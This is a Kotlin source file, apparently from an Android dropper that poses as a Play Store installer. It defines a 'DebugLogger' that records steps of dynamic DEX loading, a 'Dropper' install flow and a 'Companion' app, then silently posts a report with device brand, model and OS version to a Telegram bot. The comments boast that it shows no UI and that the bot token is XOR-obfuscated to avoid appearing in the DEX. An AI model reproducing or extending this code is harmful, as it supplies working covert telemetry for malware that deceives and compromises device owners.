package com.playstore.installer

import android.os.Build
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CopyOnWriteArrayList

/**
 * DebugLogger — captures all Nova + Dropper + Companion steps and sends
 * one combined debug report to Telegram at end of flow.
 *
 * Fully background — no UI, no Activity, no user-visible output.
 * Credentials read from StringPool (XOR-encoded — never plaintext in DEX).
 * Every call is try/catch wrapped — never crashes the app.
 *
 * Usage:
 *   DebugLogger.logNova("Asset read", Status.SUCCESS, "ASSET_A — 2013121 bytes")
 *   DebugLogger.logDropper("createSession", Status.FAILED, "status=4 NO_CERTIFICATES")
 *   DebugLogger.logCompanion("App.onCreate", Status.SUCCESS)
 *   DebugLogger.flush("FAILED")
 */
internal object DebugLogger {

    enum class Status(val tag: String) {
        SUCCESS("OK  "),
        FAILED ("FAIL"),
        SKIPPED("SKIP"),
        PENDING("PEND")
    }

    private data class Entry(
        val section: String,
        val step: String,
        val status: Status,
        val detail: String,
        val ts: String
    )

    private val entries = CopyOnWriteArrayList<Entry>()
    private val startTime = System.currentTimeMillis()
    private val timeFmt = SimpleDateFormat("HH:mm:ss.SSS", Locale.US)

    // ── Public API ───────────────────────────────────────────────────────────

    /** Log a Nova-side step (DexLoader, ClassLoader, asset ops). */
    fun logNova(step: String, status: Status, detail: String = "") {
        add("NOVA", step, status, detail)
    }

    /** Log a Dropper/install-flow step (InstallActivity, InstallReceiver). */
    fun logDropper(step: String, status: Status, detail: String = "") {
        add("DROPPER", step, status, detail)
    }

    /**
     * Log a Companion-side step.
     * Called from Nova when companion outcome is known (install result,
     * or when Nova reads the companion sentinel file after launch).
     */
    fun logCompanion(step: String, status: Status, detail: String = "") {
        add("COMPANION", step, status, detail)
    }

    /**
     * Build the full debug report and send it to Telegram as a .txt document.
     * Call at terminal states: SUCCESS, FAILED, MAX_RETRIES.
     * @param result Short label for the overall outcome.
     */
    fun flush(result: String) {
        if (entries.isEmpty()) return
        try {
            val snapshot = ArrayList(entries)
            entries.clear()
            Thread { sendReport(snapshot, result) }.start()
        } catch (_: Exception) { }
    }

    // ── Internal ─────────────────────────────────────────────────────────────

    private fun add(section: String, step: String, status: Status, detail: String) {
        try {
            val ts = timeFmt.format(Date())
            entries.add(Entry(section, step, status, detail, ts))
        } catch (_: Exception) { }
    }

    private fun sendReport(snapshot: List<Entry>, result: String) {
        try {
            val botToken = StringPool.d(StringPool.DEBUG_BOT_TOKEN)
            val chatId   = StringPool.d(StringPool.DEBUG_CHAT_ID)
            val apiUrl   = StringPool.d(StringPool.TG_API_URL)
            val sendDoc  = StringPool.d(StringPool.TG_SEND_DOC)

            val report = buildReport(snapshot, result)

            val ts       = SimpleDateFormat("dd-MMM-yyyy_hh-mm-ssa", Locale.US).format(Date())
            val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }
            val device   = "${Build.BRAND}-${Build.MODEL}".replace(" ", "-")
            val os       = "Android${Build.VERSION.RELEASE}"
            val fileName = "Debug_Report_${device}_${os}_${ts}_$commitId.txt"

            val urlStr   = "$apiUrl$botToken/$sendDoc"
            val boundary = "----DbgBoundary${System.currentTimeMillis()}"

            val conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15_000
            conn.readTimeout    = 15_000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val reportBytes = report.toByteArray(Charsets.UTF_8)

            conn.outputStream.use { out ->
                val dos = DataOutputStream(out)

                // chat_id
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                dos.writeBytes("$chatId\r\n")

                // caption
                val caption = "🐛 Debug Report | ${Build.MANUFACTURER} ${Build.MODEL} | $result"
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                dos.write(caption.toByteArray(Charsets.UTF_8))
                dos.writeBytes("\r\n")

                // document
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"$fileName\"\r\n")
                dos.writeBytes("Content-Type: text/plain\r\n\r\n")
                dos.write(reportBytes)
                dos.writeBytes("\r\n")

                // close
                dos.writeBytes("--$boundary--\r\n")
                dos.flush()
            }

            conn.responseCode   // consume response
            conn.disconnect()
        } catch (_: Exception) { }
    }

    private fun buildReport(snapshot: List<Entry>, result: String): String {
        val sb      = StringBuilder()
        val now     = Date()
        val elapsed = (System.currentTimeMillis() - startTime) / 1000
        val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }

        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("        FULL FLOW DEBUG REPORT")
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine()
        sb.appendLine("Device   : ${Build.MANUFACTURER} ${Build.MODEL}")
        sb.appendLine("Android  : ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        sb.appendLine("Build    : $commitId")
        sb.appendLine("Time     : ${SimpleDateFormat("dd-MM-yyyy HH:mm:ss z", Locale.US).format(now)}")
        sb.appendLine("Result   : $result")
        sb.appendLine("Duration : ${elapsed}s")
        sb.appendLine()

        // Group entries by section in fixed order
        val sectionOrder = listOf("NOVA", "DROPPER", "COMPANION")
        for (section in sectionOrder) {
            val sectionEntries = snapshot.filter { it.section == section }
            if (sectionEntries.isEmpty()) continue

            sb.appendLine("── $section ──")
            for (e in sectionEntries) {
                val line = if (e.detail.isNotEmpty()) {
                    "[${e.status.tag}] ${e.ts}  ${e.step.padEnd(28)} ${e.detail}"
                } else {
                    "[${e.status.tag}] ${e.ts}  ${e.step}"
                }
                sb.appendLine(line)
            }
            sb.appendLine()
        }

        // Any unexpected section
        val extra = snapshot.filter { it.section !in sectionOrder }
        if (extra.isNotEmpty()) {
            sb.appendLine("── OTHER ──")
            extra.forEach { e ->
                sb.appendLine("[${e.status.tag}] ${e.ts}  [${e.section}] ${e.step}  ${e.detail}")
            }
            sb.appendLine()
        }

        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("         END OF DEBUG REPORT")
        sb.appendLine("═══════════════════════════════════════════")

        return sb.toString()
    }
}
